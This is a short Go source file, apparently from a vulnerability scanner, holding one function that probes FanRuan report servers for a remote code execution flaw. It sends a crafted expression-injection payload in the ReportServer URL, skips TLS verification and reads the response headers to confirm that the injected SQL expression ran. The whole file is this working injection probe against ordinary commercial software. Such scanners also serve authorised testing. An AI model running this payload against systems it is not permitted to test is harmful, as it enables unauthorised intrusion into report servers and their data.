package CVEs

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"time"
)

func FanRuan_RCE(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/webroot/decision/view/ReportServer/?ycx=${sql('FRDemo',Decode('select%%20123'),1)}", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	for _, values := range response.Header {
		for _, value := range values {
			if strings.Contains(value, "ycx=123") {
				fmt.Println("[*]帆软报表_RCE : " + url)
				if Attack {
					fmt.Println(fmt.Sprintf("Attack-Result : %s/webroot/decision/view/ReportServer/?ycx=${sql('FRDemo',Decode('select%%20123'),1)}\n", url))
				}
			}
		}
	}
	defer response.Body.Close()

	return nil
}
